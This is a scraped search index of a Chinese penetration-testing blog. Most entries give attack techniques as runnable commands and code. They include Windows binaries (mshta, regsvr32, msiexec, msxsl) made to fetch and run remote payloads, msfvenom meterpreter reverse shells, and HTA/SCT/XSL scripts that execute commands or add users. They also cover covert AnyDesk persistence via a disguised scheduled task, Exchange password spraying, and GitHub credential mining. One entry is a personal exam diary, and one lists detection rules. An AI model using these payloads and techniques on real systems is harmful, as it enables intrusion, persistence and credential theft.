","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:5","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"6.FTP 一般情况下，攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。 ftp 127.0.0.1 # 这里换成我们装有payload的服务器的IP地址 username # 输入用户名 password # 密码 get file # 下载的payload文件 exit ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:6","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"7.TFTP 用来下载远程文件的最简单的网络协议，它基于UDP协议而实现 tftp32服务端下载地址：http://tftpd32.jounin.net/tftpd32_download.html tftp -i \u003c你的payload的IP\u003e get \u003c要下载payload文件\u003e \u003c存放目标机器的目录位置\u003e ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:7","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"8.WinScp WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。 #上传 winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"put D:\\1.txt /tmp/\" \"exit\" /log=log_file.txt #下载 winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"get /tmp D:\\test\\app\\\" \"exit\" /log=log_file.tx ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:8","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"9.msiexec msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行： #在攻击机器上生成msi包 msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi \u003e evil.msi #在目标机器上远程执行（直接写payload的ip和文件） msiexec /q /i http://192.168.28.128/evil.msi ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:9","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"10.IEExec IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。 先在攻击机生成Payload： msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe 使用管理员身份打开cmd，分别运行下面两条命令。 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\u003ecaspol.exe -s off C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\u003eIEExec.exe http://192.168.28.131/evil.exe ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:10","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"11.mshta mshta用于执行.hta文件，而hta是HTML Applocation的缩写，也就是HTML应用程序。 而hta中也支持VBS。所以我们可以利用hta来下载文件。 1.生成payload.hta run.hta内容如下： \u003cHTML\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"\u003e \u003cHEAD\u003e \u003cscript language=\"VBScript\"\u003e Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(\"Wscript.Shell\") objShell.Run \"cmd.exe /c net user test password /add\" // 这里填写命令 self.close \u003c/script\u003e \u003cbody\u003e demo \u003c/body\u003e \u003c/HEAD\u003e \u003c/HTML\u003e 或者参考这个文章生成hta:https://www.cnblogs.com/backlion/p/10491616.html 方法1：MSFVenom # 先生成payload msfvenom -p windows/meterpreter/reverse_tcp lhost=121.36.37.235 lport=2222 -f hta-psh \u003e shell.hta # msf监听 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.1.109 set lport 1234 exploit 方法2：Metasploit use exploit/windows/misc/hta_server msf exploit(windows/misc/hta_server) \u003e set srvhost 192.168.1.109 msf exploit(windows/misc/hta_server) \u003e exploit # 目标上 mshta.exe http://192.168.1.109:8080/pKz4Kk059Nq9.hta 2.然后再在目标机器执行前面生成的hta： mshta http://192.168.28.128/run.hta ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:11","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"12.rundll32 其实还是依赖于WScript.shell这个组件在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序(项目地址：https://github.com/Hood3dRob1n/JSRat-Py.git)。 1.开始运行JSRat，监听本地8888端口。 ./JSRat.py -i 192.168.0.115 -p 8888 2.通过url访问，可以查看到恶意代码，复制上面生成的代码 3.在受害者PC运行该代码，将成功返回一个会话 ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:12","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"13.regsvr32 Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行 在目标机上执行： regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll # file.sct需要我们自己来构造 可以通过自己构造.sct文件中要执行的命令，去下载执行我们的程序(这里以弹计算器为例)： \u003c?XML version=\"1.0\"?\u003e \u003cscriptlet\u003e \u003cregistration progid=\"ShortJSRAT\" classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" \u003e \u003cscript language=\"JScript\"\u003e \u003c![CDATA[ ps = \"cmd.exe /c calc.exe\"; new ActiveXObject(\"WScript.Shell\").Run(ps,0,true); ]]\u003e \u003c/script\u003e \u003c/registration\u003e \u003c/scriptlet\u003e ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:13","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"14.MSXSL.EXE msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。 下载地址为：https://www.microsoft.com/en-us/download/details.aspx?id=21714 msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下： msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl demo.xml \u003c?xml version=\"1.0\"?\u003e \u003c?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?\u003e \u003ccustomers\u003e \u003ccustomer\u003e \u003cname\u003eMicrosoft\u003c/name\u003e \u003c/customer\u003e \u003c/customers\u003e exec.xsl（这里以弹计算器为例） \u003c?xml version='1.0'?\u003e \u003cxsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\"\u003e \u003cmsxsl:script language=\"JScript\" implements-prefix=\"user\"\u003e function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\"); # 这里修改为我们要执行的命令 return nodelist.nextNode().xml; } \u003c/msxsl:script\u003e \u003cxsl:template match=\"/\"\u003e \u003cxsl:value-of select=\"user:xml(.)\"/\u003e \u003c/xsl:template\u003e \u003c/xsl:stylesheet\u003e ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:14","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"15.pubprn.vbs 在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject() \"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\" 127.0.0.1 script:https://gist.githubusercontent.com/xps/64acdkpodsk4566b04a/raw/a006a4 7e4075785016a62f7e5170ef36f5247cdb/test.sct test.sct（和13一样，这里以弹计算器为例） \u003c?XML version=\"1.0\"?\u003e \u003cscriptlet\u003e \u003cregistration description=\"Bandit\" progid=\"Bandit\" version=\"1.00\" classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\" remotable=\"true\" \u003e \u003c/registration\u003e \u003cscript language=\"JScript\"\u003e \u003c![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]\u003e \u003c/script\u003e \u003c/scriptlet\u003e ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:15","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["生活"],"content":"今年的六级考试，也因为疫情原因推迟到了九月份，故2020届毕业生也有了一次毕业之后再次进入到校园的一次小机会。 上午等待朋友的到来，然后一起听了听听力，背了背作文，然后中午一起去吃了麻辣拌。可能中午在家睡的时间太长，以致于匆匆忙忙赶着去考场，下午三点开考，两点四十五左右我才进到学校北门，真是失算啊。匆忙进到考场，可算是赶上了。 开考了，发下答题卡之后写名字，忽然发现自己拿起笔之后由于太长时间不动笔，都快不会写字了😄。省略一堆过程… …虽然没好好备考，但是答题的过程却很认真，两个多小时一下就过去了，甚至感觉时间不够用，也许是因为这是最后一次坐在这个学校里面考试了吧。考试过程中，窗外是篮球场上打篮球的声音，久违的声音，让人感到心安而怀念。 考完之后，走出尚德楼，傍晚时分，温度刚刚好，阳光刚刚好，旁边走过去的人讨论着刚考完的翻译和作文What is worth doing is worth doing well，奇迹般感觉自己仿佛又重新回到了大学一样，那是一种毕业之后的几个月来从未有过的心安。 我有一种想要升学重新回到我的师范校园的冲动。 不过由于晚上值夜班，所以没做过多停留，只能和学弟在食堂匆匆吃完饭，打车回项目上了。 每个人的校园生活都值得怀念，每个人的青春都值得回忆。 下面是一些当天拍的照片： ","date":"2020-09-20","objectID":"/%E8%BF%94%E6%A0%A1%E8%80%83%E5%85%AD%E7%BA%A7/:0:0","tags":["碎碎念","返校的诱惑"],"title":"返校考六级","uri":"/%E8%BF%94%E6%A0%A1%E8%80%83%E5%85%AD%E7%BA%A7/"},{"categories":["渗透测试"],"content":"下载地址：https://github.com/fatedier/frp.git 跨平台，根据自己情况选择使用 ","date":"2020-09-10","objectID":"/frp/:0:0","tags":["frp","内网穿透","端口转发"],"title":"frp","uri":"/frp/"},{"categories":["渗透测试"],"content":"配置文件 服务端 客户端 ","date":"2020-09-10","objectID":"/frp/:0:1","tags":["frp","内网穿透","端口转发"],"title":"frp","uri":"/frp/"},{"categories":["渗透测试"],"content":"部署 服务端 连接到vps上，后台启动服务端 nohup ./frps -c frps.int \u0026 jobs -l cat frps.log 客户端 将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行 frpc.exe -c frpc.int 当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到 但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作， 所以可结合execute在目标机无输出执行程序。 sleep 10 execute c:/frpc.exe -c c:/frpc.ini shell netstat -ano |findstr 7007 Windows Windows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。 Frp的用法比较灵活且运行稳定。如可将frp服务端挂在\"肉鸡\"上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。 ","date":"2020-09-10","objectID":"/frp/:0:2","tags":["frp","内网穿透","端口转发"],"title":"frp","uri":"/frp/"},{"categories":["渗透测试"],"content":"XSL是指扩展样式表语言(Extension Stylesheet Language) msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=21714 执行该工具需要用到2个文件，分别为XML及XSL文件，msxsl命令行接受参数形式如下： msxsl.exe {xmlfile} {xslfile} # 调用文件内的命令 msxsl.exe {xslfile} {xslfile} ","date":"2020-09-10","objectID":"/xsl-script-processing/:0:0","tags":["XSL Script Processing","MSXSL.exe"],"title":"XSL Script Processing","uri":"/xsl-script-processing/"},{"categories":["渗透测试"],"content":"命令执行 技术复现（MSXSL.EXE） 本地执行 test.xml \u003c?xml version=\"1.0\"?\u003e \u003c?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?\u003e \u003ccustomers\u003e \u003ccustomer\u003e \u003cname\u003eMicrosoft\u003c/name\u003e \u003c/customer\u003e \u003c/customers\u003e exec.xsl \u003c?xml version=\"1.0\"?\u003e \u003cxsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\"\u003e \u003cmsxsl:script language=\"JScript\" implements-prefix=\"user\"\u003e function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\"); //这里可以改造为执行你的木马文件如： // var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /k cd c:\\ \u0026 shell.exe\"); return nodelist.nextNode().xml; } \u003c/msxsl:script\u003e \u003cxsl:template match=\"/\"\u003e \u003cxsl:value-of select=\"user:xml(.)\"/\u003e \u003c/xsl:template\u003e \u003c/xsl:stylesheet\u003e 执行 msxsl.exe test.xml exec.xsl 远程执行 msxsl.exe https://raw.githubusercontent.com/xx/master/test.xml https://raw.githubusercontent.com/xx/master/exec.xsl 技术复现（WMIC.EXE） wmic可通过如下方式执行xsl内的恶意代码 wmic.exe {wmic_cmd} /FORMAT:{xsl_file} 本地执行 wmic.exe process get name /format:exec.xsl 远程执行 wmic.exe process get name /format:http:/www.xxx.com/exec.xsl https://www.cnblogs.com/backlion/p/10489916.html ","date":"2020-09-10","objectID":"/xsl-script-processing/:0:1","tags":["XSL Script Processing","MSXSL.exe"],"title":"XSL Script Processing","uri":"/xsl-script-processing/"},{"categories":["渗透测试"],"content":"威胁检测 数据源： 进程监视、进程命令行参数、网络的进程使用、DLL监视 msxsl.exe 进程特征： # 当msxsl.exe作为父进程创建其他进程时视为可疑 ParentImage regex '^.*msxsl\\.exe$' 加载项特征： #当msxsl.exe加载jscript.dll时视为可疑 Image regex '^.*msxsl\\.exe$' AND ImageLoaded contains 'jscript.dll' wmic.exe 加载项特征 #当wmic.exe加载jscript.dll时视为可疑 Image regex '^.*wmic\\.exe$' AND ImageLoaded contains 'jscript.dll' ","date":"2020-09-10","objectID":"/xsl-script-processing/:0:2","tags":["XSL Script Processing","MSXSL.exe"],"title":"XSL Script Processing","uri":"/xsl-script-processing/"},{"categories":["渗透测试"],"content":"通过MSXSL方式进行鱼叉式网络钓鱼 有年头的参考文章：https://www.anquanke.com/post/id/159316 ","date":"2020-09-10","objectID":"/xsl-script-processing/:0:3","tags":["XSL Script Processing","MSXSL.exe"],"title":"XSL Script Processing","uri":"/xsl-script-processing/"},{"categories":["渗透测试"],"content":" anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小 ","date":"2020-09-10","objectID":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/:0:0","tags":["远控","anydesk"],"title":"使用anydesk做远控","uri":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/"},{"categories":["渗透测试"],"content":"场景举例 有云锁，护卫神等禁止3389登录时 类似阿里云这种，登录3389会报警 连接内网中可以出网的windows机器 ","date":"2020-09-10","objectID":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/:0:1","tags":["远控","anydesk"],"title":"使用anydesk做远控","uri":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/"},{"categories":["渗透测试"],"content":"注意事项 启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都 是没有桌面用户权限的，如果启动anydesk不会成功 启动anydesk时桌面不能被注销 有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用 winlogon启动anydesk，否则没法使用屏幕 ","date":"2020-09-10","objectID":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/:0:2","tags":["远控","anydesk"],"title":"使用anydesk做远控","uri":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/"},{"categories":["渗透测试"],"content":"使用方法 习惯性的使用https://www.virustotal.com/gui扫描一下 假设获取到了目标系统的一个msf的shell # 下载anydesk到一个公共目录下 (New-Object System.Net.WebClient).DownloadFile(\"https://download.anydesk.com/AnyDesk.exe?_ga=2.176752485.1141763109.1599703967-925913843.1599703967\",\"C:\\Users\\Public\\Desktop\\anydesk.exe\") # 确定有哪些用户正在使用桌面??? (((Get-WmiObject -Class Win32_Process -Filter 'Name=\"explorer.exe\"').GetOwner().)) # 启动一个计划任务，启动的用户为上个步骤选中的用户??? schtasks /Create /TN Windwos_Security_Update /SC monthly /tr \"c:\\......\" # 先执行一次计划任务，生成配置文件 schtasks /run /tn Windwos_Security_Update # 等待几秒，等anydesk成功连接到网络，再把anydesk进程杀掉，dir看用户下面是否生成配置文件，然后再service.conf里面的添加密码(AnyDeskGetAccess) # 查看anydeskID并启动anydesk # 不需要到目标机器上点击接受，输入密码即可 # 分享一个高权限webshell下可以使用的powershell脚本 ","date":"2020-09-10","objectID":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/:0:3","tags":["远控","anydesk"],"title":"使用anydesk做远控","uri":"/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/"},{"categories":["渗透测试"],"content":" 下载地址：https://github.com/dafthack/MailSniper.git ","date":"2020-08-23","objectID":"/mailsniper-ps1/:0:0","tags":["mailsniper.ps1","信息搜集"],"title":"mailsniper.ps1","uri":"/mailsniper-ps1/"},{"categories":["渗透测试"],"content":"mailsniper.ps1获取outlook所有联系人 收集邮箱，为后续爆破准备 前提 掌握其中一个用户邮箱的账户密码，并可以登录outlook 利用 命令格式 # 在域内机器上执行 powershell -exec bypass Import-Module .\\MailSniper.ps1 Get-GlobalAddressList -ExchHostname outlook地址 -UserName 域名\\域用户名 -Password 已知的邮箱密码 -OutFile 导出结果.txt 1.目标outlook搭建在自己的服务器上 ExchHostname指向自己的邮箱服务器地址即可 2.目标outlook在office365中 一样的道理，只不过把ExchHostname指向outlook.office365.com即可，username使用完整的邮箱，而不仅仅是用户名。 爆破exchange（指定密码爆破邮箱） powershell -exec bypass Import-Module .\\MailSniper.ps1 Invoke-PasswordSprayEWS -ExchHostname owa2013.rootkit.org -UserList .\\users.txt -Password Admin12345 -ExchangeVersion Exchange2013_SP1 # -ExchHostname：ping -a exchange服务器ip -\u003e 得到主机名 -\u003e 主机名拼接域名（如：owa2013.rootkit.org） # -ExchangeVersion：若不知道可先不指定 MailSniper检索邮件内容 Mailsniper包含两个主要的cmdlet，分别是Invoke-SelfSearch和Invoke-GlobalMailSearch，用于检索邮件中的关键字。 ## 查找当前用户的Exchange邮箱数据 Invoke-SelfSearch -Mailbox zhangsan@fb.com -Terms *机密* -Folder 收件箱 -ExchangeVersion Exchange2013_SP1 # 查找邮件内容中包含pwn字符串的邮件，-Folder参数可以指定要搜索的文件夹，默认是inbox，使用时最好指定要搜索的文件夹名称（或者指定all查找所有文件），因为该工具是外国人写的，Exchange英文版收件箱为Inbox，当Exchange使用中文版时收件箱不为英文名，默认查找inbox文件夹会因找不到该文件而出错 ## 查找所有用户的Exchange邮箱数据 Invoke-GlobalMailSearch -ImpersonationAccount zhangsan -ExchHostname test2k12 -AdminUserName fb.com\\administrator -ExchangeVersion Exchange2013_SP1 -Term \"*内部邮件*\" -Folder 收件箱 # 利用administrator管理员用户为普通用户zhangsan分配ApplicationImpersonation角色，检索所有邮箱用户的邮件中，包括“内部邮件”关键字的内容 ","date":"2020-08-23","objectID":"/mailsniper-ps1/:1:0","tags":["mailsniper.ps1","信息搜集"],"title":"mailsniper.ps1","uri":"/mailsniper-ps1/"},{"categories":["渗透测试"],"content":"搜索引擎语法 百度 谷歌 必应 在线接口 http://cebaidu.com/index/getRelatedSites?site_address=baidu.com http://www.webscan.cc/ http://sbd.ximcx.cn/ https://censysio/certificates?q=example.com https://crt.sh/?q=%25example.com https://github.com/cOny1WorkScripts/tree/master/get-subdomain-from-baidu https://dnsdumpster.com/ https://ww.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com https://findsubdomains.com/ https://dnslytics.com/search?q=www.baidu.com https://pentest-tools.com/information-gathering/find-subdomains-of-domain https://viewdns.info/ https://www.ipneighbour.com#/lookup/114.114.114.114 https://securitytrails.com/list/apex_domain/baidu.com https://url.fht.im/ http://api.hackertarget.com/hostsearch/?q=baidu.com http://ww.yunseecn/finger.html 相关工具 https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md DNS历史解析记录 … … Github Hacking 可以搜索以下类型的信息：Repositories,Topics,Issues and pull requests,Code,Commits,Users,Wikis 搜索仓库 \u003e exp stars:\u003e1000 # 匹配关键字\"exp\"且star大于1000的仓库 \u003e= exp topics:\u003e=5 # 匹配关键字\"exp\"且标签数量大于等于5的仓库 \u003c exp size:\u003e=1000 # 匹配关键字\"exp\"且文件大于1KB的仓库 \u003c= n..* exp stars:1000..* # 匹配关键字\"exp\"且star大于等于1000的仓库 *..n exp stars:*..1000 # 匹配关键字\"exp\"且star小于等于1000的仓库 n..n exp stars:10..1000 # 匹配关键字\"exp\"且star大于10并小于1000的仓库 其他语法类似… … 搜索代码 注意事项 - 只能搜索小于384 KB的文件。 - 只能搜索少于500,000个文件的存储库。 - 登录的用户可以搜索所有公共存储库。 - 除filename 搜索外，搜索源代码时必须至少包含-一个搜索词。 例如，搜索language:javascript无效，而是这样: amazing language :javascript。 - 搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。 - 您不能将以下通配符用作搜索查询的一部分:， ，: ; /\\'\"=*!?#$\u0026+^|~\u003c\u003e(){}[]。搜索将忽略这些符号。 日期条件 exp pushed:\u003c2020-08-08 # 搜索在2020年8月8日前push的代码,关键字是exp exp pushed:2020-05-05..2020-08-08 # 日期区间 exp created:\u003e=2020-08-08 # 创建时间 逻辑运算 AND OR NOT 排除运算 exp pushed:\u003c2020-08-08 -language:java # 搜索在2020年8月8日前push的代码，关键字是exp，排除java语言的仓库 包含搜索 exp in:file # 搜索文件中包含exp的代码 exp in:path # 搜索路径中包含exp的代码 exp in:file,path # 搜索文件、路径中包含exp的代码 console path:app/public language:javascript # 搜索关键字console,语言为js，在app/public下的代码 主体搜索 user:USERNAME # 用户名搜索 org:ORGNAME # 组织搜索 repo:USERNAME/REPOSITORY # 指定仓库搜索 文件大小 size:\u003e1000 # 搜索大于1KB的文件 文件名称 filename :config.php language:php # 搜索文件名为config.php,且语言为php的代码 # 例如搜索Java项目配置文件: mail filename:.properties 拓展名 extension:EXTENSION # 指定扩展名搜索 # 例如: extension:properties jdbc 自动化工具 https://github.com/UnkL4b/GitMiner # 简单用法 # -r 正则， -q 查询关键字 python3 gitminer-v2.0.py -C cookie.txt -q 'extension:properties jdbc' -r 'password(.*)' -m passwords ","date":"2020-08-18","objectID":"/%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2-osint/:0:0","tags":["情报信息搜索","Githun Hacking"],"title":"开源情报信息搜索(OSINT)","uri":"/%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2-osint/"},{"categories":["渗透测试"],"content":"常用网站 CVE Exploit-DB CX Security CNVD Security tracker Search Exploit-DB kali中自带 searchsploit # 搜索Windows提权漏洞 searchsploit -t windows local # 搜索Apache漏洞 searchsploit -t apache ","date":"2020-08-18","objectID":"/%E5%BC%80%E6%94%BE%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/:0:0","tags":["开放漏洞情报"],"title":"开放漏洞情报","uri":"/%E5%BC%80%E6%94%BE%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/"},{"categories":["渗透测试"],"content":" 一个强大实用的黑客暴力破解字典建立工具 地址：https://github.com/LandGrey/pydictor.git 简单示例 生成字典 python pydictor.py --sedb 合并去重 python pydictor.py -tool uniqbiner /my/all/dict/ 多字典文件组合工具 python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt 使用pydictor有个窍门： 时刻清楚你想要什么样子的字典. pydictor可以生成的所有字典的类型及其说明 归属 类别 标识符 描述 支持功能代号 core base C1 基础字典 F1 F2 F3 F4 core char C2 自定义字符集字典 F1 F2 F3 F4 core chunk C3 排列组合字典 ALL core conf C4 配置语法生成字典 ALL core extend C5 规则扩展字典 ALL core sedb C6 社会工程学字典 ALL tool combiner T1 字典合并工具 tool comparer T2 字典比较相减工具 ALL tool counter T3 词频统计工具 ALL tool handler T4 筛选处理原有字典工具 ALL tool uniqbiner T5 先合并后去重工具 ALL tool uniqifer T6 字典去重工具 ALL tool hybrider T7 多字典文件组合工具 F1 F2 F3 F4 plugin birthday P1 生日日期字典插件 ALL plugin ftp P2 关键词生成ftp密码字典插件 ALL plugin pid4 P3 身份证后四位字典插件 ALL plugin pid6 P4 身份证后六位字典插件 ALL plugin pid8 P5 身份证后八位字典插件 ALL plugin scratch P6 网页原始关键词字典插件 ALL 字典操作功能及说明对照表 功能 功能代号 说明 len F1 定义长度范围 head F2 添加前缀 tail F3 添加后缀 encode F4 编码或自定义加密方法 occur F5 字母、数字、特殊字符出现次数范围筛选 types F6 字母、数字、特殊字符各种类数范围筛选 regex F7 正则筛选 level F8 字典级别筛选 leet F9 1337 模式 repeat F10 字母、数字、特殊字符连续出现次数范围筛选 支持的编码或加密方式 方式 描述 none 默认方式, 不进行任何编码 b16 base16 编码 b32 base32 编码 b64 base64 编码 des des 算法, 需要根据情况修改代码 execjs 执行本地或远程js函数, 需要根据情况修改代码 hmac hmac 算法, 需要根据情况修改代码 md5 md5 算法输出32位 md516 md5 算法输出16位 rsa rsa 算法 需要根据情况修改代码 sha1 sha-1 算法 sha256 sha-256 算法 sha512 sha-512 算法 url url 编码 test 一个自定义编码方法的示例 --encode b64 occur 功能 用法 : --occur [字母出现次数的范围] [数字出现次数的范围] [特殊字符出现次数的范围] 示例: --occur \"\u003e=4\" \"\u003c6\" \"==0\" types 功能 用法 : --types [字母种类的范围] [数字种类的范围] 